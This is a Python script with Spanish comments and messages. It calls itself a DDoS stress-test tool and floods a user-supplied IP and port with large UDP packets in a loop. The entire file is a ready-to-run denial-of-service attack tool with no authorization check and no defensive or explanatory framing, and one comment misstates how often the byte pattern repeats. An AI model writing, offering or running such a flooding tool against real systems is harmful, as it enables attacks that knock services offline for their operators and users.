import socket
import random
import argparse
import time
from datetime import datetime
from tqdm import tqdm

# Función para iniciar el ataque DDoS
def iniciar_ataque(ip_target, port, total_paquetes):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_bytes = bytes(range(0, 256)) * 1000  # Esto creará un patrón ascendente desde 0 hasta 255 repetido 5 veces

    print("\nIniciando ataque DDoS...")
    print(f"Objetivo: {ip_target}:{port}")
    print(f"Cantidad de paquetes a enviar: {total_paquetes}\n")

    with tqdm(total=total_paquetes, unit="paquetes") as progress_bar:
        try:
            for i in range(total_paquetes):
                udp_socket.sendto(udp_bytes, (ip_target, port))
                progress_bar.update(1)
                time.sleep(0.0001)  # Pequeña pausa para la visualización

            udp_socket.close()
            print("\nAtaque DDoS completado.")
        except KeyboardInterrupt:
            print("\nAtaque DDoS detenido por el usuario.")
        except Exception as e:
            print(f"Se produjo un error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Herramienta de Prueba de Estrés DDoS")
    parser.add_argument("ip", type=str, help="IP del objetivo")
    parser.add_argument("port", type=int, help="Puerto de destino")
    parser.add_argument("packets", type=int, help="Cantidad de paquetes a enviar")
    parser.add_argument("--interactive", action="store_true", help="Modo interactivo")

    args = parser.parse_args()

    if args.interactive:
        print("Modo interactivo activado. Siga las instrucciones:")
        args.ip = input("Ingrese la IP del objetivo: ")
        args.port = int(input("Ingrese el puerto: "))
        args.packets = int(input("Ingrese la cantidad de paquetes: "))

    iniciar_ataque(args.ip, args.port, args.packets)

if __name__ == '__main__':
    main()
